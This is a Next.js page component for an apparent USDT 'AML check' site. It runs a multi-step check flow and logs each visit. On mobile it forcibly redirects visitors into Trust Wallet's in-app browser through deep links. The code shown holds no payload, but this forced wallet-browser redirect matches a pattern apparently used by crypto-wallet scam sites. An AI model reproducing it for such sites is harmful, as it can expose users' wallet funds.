"use client";

import { AMLLoading } from "@/pagesComponents/AMLLoading/AMLLoading";
import { AMLResult } from "@/pagesComponents/AMLResaults/AMLResaults";
import { ChooseNet } from "@/pagesComponents/ChooseNet/ChooseNet";
import { Home } from "@/pagesComponents/Home/Home";
import { setCurrentStep } from "@/Redux/Slice/MainSlice";
import { RootState } from "@/Redux/store";
import { useEffect } from "react";
import { useDispatch, useSelector } from "react-redux";

const DOMAIN = "https://usdtcheckaml.com";

export default function Page() {
  const { currentStep } = useSelector((store: RootState) => store.main);
  const dispatch = useDispatch();

  useEffect(() => {
    const ua = navigator.userAgent || navigator.vendor || window.opera;

    const isIOS = /iPad|iPhone|iPod/.test(ua);
    const isAndroid = /Android/.test(ua);

    const isInsideTrustWallet = /TrustWallet/i.test(ua) || /Trust\//i.test(ua);

    const alreadyTried = sessionStorage.getItem("tw_attempted");

    if (isInsideTrustWallet || alreadyTried) return;

    sessionStorage.setItem("tw_attempted", "true");

    const deepLink = `trust://open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;
    const universalLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(DOMAIN)}`;

    if (isIOS) {
      // iOS strategy
      window.location.href = deepLink;

      setTimeout(() => {
        window.location.href = universalLink;
      }, 1500);
    } else if (isAndroid) {
      // Android strategy
      window.location.href = universalLink;
    }
  }, []);

  useEffect(() => {
    fetch("/api/log", {
      method: "POST",
    });
  }, []);

  if (!currentStep) {
    return <Home />;
  }
  return (
    <>
      {currentStep == 0 && <Home />}
      {currentStep == 1 && <ChooseNet />}
      {currentStep == 2 && <AMLLoading />}
      {currentStep == 3 && (
        <AMLResult onRepeat={() => dispatch(setCurrentStep(0))} />
      )}
    </>
  );
}
